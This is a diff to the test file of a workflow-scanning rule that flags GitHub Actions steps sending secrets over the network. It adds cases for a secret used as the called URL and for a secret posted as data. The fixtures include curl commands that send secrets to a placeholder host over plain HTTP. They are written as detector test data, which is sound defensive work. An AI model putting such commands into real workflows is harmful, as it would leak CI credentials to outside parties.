@@ -39,6 +39,13 @@ describe('DOME-GHA-001', () => {
     expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['review:secretsToNetwork@.github/workflows/x.yml:6']);
   });
 
+  it('reviews a secret that is itself the URL being called', async () => {
+    const steps = '      - run: curl -X POST -d {} "${{ secrets.BUILD_HOOK }}?branch=main"\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['review:secretsToNetwork@.github/workflows/x.yml:6']);
+    const data = '      - run: curl -X POST -d "${{ secrets.T }}"\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', data) })).toEqual(['block:secretsToNetwork@.github/workflows/x.yml:6']);
+  });
+
   it('still blocks a named secret sent over plain HTTP or to a raw IP', async () => {
     const http = '      - run: curl -d "${{ secrets.T }}" http://example.invalid/DOME_FIXTURE\n';
     expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', http) })).toContain('block:secretsToNetwork@.github/workflows/x.yml:6');
